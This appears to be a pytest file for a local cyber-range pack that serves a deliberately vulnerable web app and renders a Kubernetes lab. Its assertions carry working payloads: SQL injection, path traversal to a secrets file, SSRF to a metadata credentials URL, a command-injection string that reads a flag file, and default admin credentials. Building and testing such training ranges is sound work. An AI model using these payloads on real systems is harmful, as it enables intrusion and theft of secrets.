from __future__ import annotations

import json
import subprocess
import sys
from collections.abc import Mapping
from pathlib import Path
from typing import Any
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import urlopen

import yaml

import openrange as OR
import openrange.packs as _packs  # noqa: F401
from openrange.core import Manifest, Node, WorldGraph
from openrange.runtime import (
    materialize_artifacts,
    read_base_url,
    read_requests,
    start_runtime_process,
    stop_process,
)


def test_cyber_webapp_offense_pack_exposes_local_offense_range(
    tmp_path: Path,
) -> None:
    flag = "ORANGE{full_cyber_offense_pack}"
    pack = OR.PACKS.resolve("cyber.webapp.offense")
    manifest = Manifest.load(
        {
            "world": {"goal": "exercise the local offense range"},
            "pack": {"id": "cyber.webapp.offense"},
        },
    )
    world_attrs = {
        "service": "webapp",
        "title": "Ops Portal",
        "flag": flag,
        "mode": manifest.mode,
        "difficulty": "test",
        "npc_count": 0,
    }
    graph = WorldGraph(nodes=(Node("webapp", "webapp", world_attrs),))
    bundle = pack.realize(graph, manifest)
    entrypoint = bundle.entrypoints[0]
    app_root = tmp_path / "pack"
    request_log = tmp_path / "requests.jsonl"
    materialize_artifacts(bundle.files(), app_root)
    process = start_runtime_process(
        app_root / "app.py",
        entrypoint,
        world_attrs,
        request_log,
    )
    try:
        base_url = read_base_url(process)

        assert fetch(base_url, "/")[0] == 200
        assert "localhost range only" in fetch(
            base_url,
            "/.well-known/security.txt",
        )[1]
        openapi = fetch_json(base_url, "/openapi.json")
        assert "/ops" in openapi["paths"]

        robots = fetch(base_url, "/robots.txt")[1]
        admin_path = robots.split(":", 1)[1].strip()
        assert fetch_json(base_url, admin_path)["flag"] == flag

        assert fetch_json(base_url, path("/api/admin", debug="1", as_="admin"))[
            "flag"
        ] == flag
        assert fetch(base_url, "/api/admin")[0] == 403

        assert fetch_json(base_url, path("/search", q="quarterly"))["rows"][0][
            "value"
        ] == "public status"
        assert fetch(base_url, path("/search", q="'"))[0] == 500
        assert (
            fetch_json(
                base_url,
                path(
                    "/search",
                    q="' UNION SELECT flag -- ",
                    asset="finance_docs",
                ),
            )["rows"][0]["value"]
            == flag
        )

        assert fetch_json(base_url, path("/records", record="public"))["owner"] == (
            "public"
        )
        assert (
            fetch_json(base_url, path("/records", record="admin-console"))["flag"]
            == flag
        )

        assert fetch(base_url, path("/download", path="reports/public.txt"))[1] == (
            "public report\n"
        )
        assert fetch(base_url, path("/download", path="missing.txt"))[0] == 404
        assert flag in fetch(
            base_url,
            path("/download", path="../../secrets/admin.env"),
        )[1]

        assert fetch(base_url, "/fetch")[0] == 400
        assert fetch(base_url, path("/fetch", url="https://example.test"))[0] == 403
        assert (
            fetch_json(
                base_url,
                path("/fetch", url="http://metadata.local/latest/credentials"),
            )["flag"]
            == flag
        )

        assert fetch(base_url, path("/ops", host="127.0.0.1"))[1] == (
            "scan=127.0.0.1\n"
        )
        assert flag in fetch(
            base_url,
            path("/ops", host="127.0.0.1;cat /opt/openrange/flag.txt"),
        )[1]

        assert fetch(base_url, path("/idp/token", username="admin"))[0] == 401
        token = fetch_json(
            base_url,
            path("/idp/token", username="admin", password="admin"),
        )["access_token"]
        assert fetch(base_url, "/vault")[0] == 403
        assert fetch_json(base_url, path("/vault", token=str(token)))["secret"] == flag
        assert "password=admin" in fetch(base_url, "/mailbox/support")[1]
        assert fetch(base_url, "/missing")[0] == 404

        events = fetch_json(base_url, "/siem/events")
        assert isinstance(events, list)
        assert event_names(events) >= {
            "CommandInjection",
            "CredentialObtained",
            "InitialAccess",
            "SensitiveAssetRead",
            "UnauthorizedCredentialUse",
        }
        assert all("event" not in row for row in read_requests(request_log))
    finally:
        stop_process(process)


def test_cyber_webapp_offense_pack_renders_kind_lab(tmp_path: Path) -> None:
    flag = "ORANGE{kind_range_flag}"
    pack = OR.PACKS.resolve("cyber.webapp.offense")
    renderer = pack.dir / "kind" / "render_kind.py"
    outdir = tmp_path / "kind-range"

    subprocess.run(
        [sys.executable, str(renderer), "--out", str(outdir), "--flag", flag],
        check=True,
        cwd=pack.dir,
        text=True,
    )

    expected_files = {
        "cilium-policies.yaml",
        "configmaps.yaml",
        "deployments.yaml",
        "kind-config.yaml",
        "kustomization.yaml",
        "manifest-summary.json",
        "namespaces.yaml",
        "networkpolicies.yaml",
        "secrets.yaml",
        "services.yaml",
    }
    assert {path.name for path in outdir.iterdir()} == expected_files

    summary = json.loads((outdir / "manifest-summary.json").read_text())
    assert summary["runtime"] == "kind"
    assert summary["service_count"] == 8
    assert summary["weakness_count"] == 9
    assert summary["entrypoint"] == (
        "http://svc-web.openrange-dmz.svc.cluster.local:8080"
    )
    assert flag not in json.dumps(summary)

    kind_config = yaml.safe_load((outdir / "kind-config.yaml").read_text())
    assert kind_config["kind"] == "Cluster"
    assert kind_config["name"] == "openrange-cyber-offense"

    resources = load_yaml_resources(outdir)
    assert resource_names(resources, "Namespace") == {
        "openrange-corp",
        "openrange-data",
        "openrange-dmz",
        "openrange-external",
        "openrange-management",
    }
    assert resource_names(resources, "Deployment") >= {
        "sandbox-blue",
        "sandbox-red",
        "svc-db",
        "svc-email",
        "svc-fileshare",
        "svc-idp",
        "svc-siem",
        "svc-web",
    }
    assert resource_names(resources, "Service") >= {
        "svc-db",
        "svc-email",
        "svc-fileshare",
        "svc-idp",
        "svc-siem",
        "svc-web",
    }
    assert resource_names(resources, "NetworkPolicy") >= {
        "allow-blue-management",
        "allow-red-to-web",
        "default-deny",
    }
    assert resource_names(resources, "CiliumNetworkPolicy") >= {
        "allow-dns-egress",
        "l7-web-offense-surface",
    }

    configmaps = resources_by_kind(resources, "ConfigMap")
    webapp = configmaps["svc-web-app"]
    briefing = configmaps["openrange-cyber-briefing"]
    assert "def main()" in webapp["data"]["app.py"]
    assert "red-reference-plan.json" in briefing["data"]
    assert "sql_injection" in briefing["data"]["topology.json"]

    secrets = resources_by_kind(resources, "Secret")
    assert secrets["openrange-range-secrets"]["stringData"]["flag"] == flag


def fetch(base_url: str, url_path: str) -> tuple[int, str]:
    try:
        with urlopen(base_url + url_path, timeout=5) as response:
            return response.status, response.read().decode()
    except HTTPError as exc:
        return exc.code, exc.read().decode()


def fetch_json(base_url: str, url_path: str) -> Any:
    return json.loads(fetch(base_url, url_path)[1])


def path(route: str, **query: str) -> str:
    normalized = {
        ("as" if key == "as_" else key): value for key, value in query.items()
    }
    return f"{route}?{urlencode(normalized)}"


def event_names(rows: object) -> set[str]:
    if not isinstance(rows, list | tuple):
        return set()
    return {
        str(row["event"])
        for row in rows
        if isinstance(row, Mapping) and "event" in row
    }


def load_yaml_resources(root: Path) -> list[Mapping[str, Any]]:
    resources: list[Mapping[str, Any]] = []
    for name in (
        "namespaces.yaml",
        "configmaps.yaml",
        "secrets.yaml",
        "deployments.yaml",
        "services.yaml",
        "networkpolicies.yaml",
        "cilium-policies.yaml",
    ):
        loaded = yaml.safe_load_all((root / name).read_text())
        resources.extend(
            item for item in loaded if isinstance(item, Mapping) and "kind" in item
        )
    return resources


def resource_names(resources: list[Mapping[str, Any]], kind: str) -> set[str]:
    return {
        str(resource["metadata"]["name"])
        for resource in resources
        if resource.get("kind") == kind
        and isinstance(resource.get("metadata"), Mapping)
    }


def resources_by_kind(
    resources: list[Mapping[str, Any]],
    kind: str,
) -> dict[str, Mapping[str, Any]]:
    return {
        str(resource["metadata"]["name"]): resource
        for resource in resources
        if resource.get("kind") == kind
        and isinstance(resource.get("metadata"), Mapping)
    }
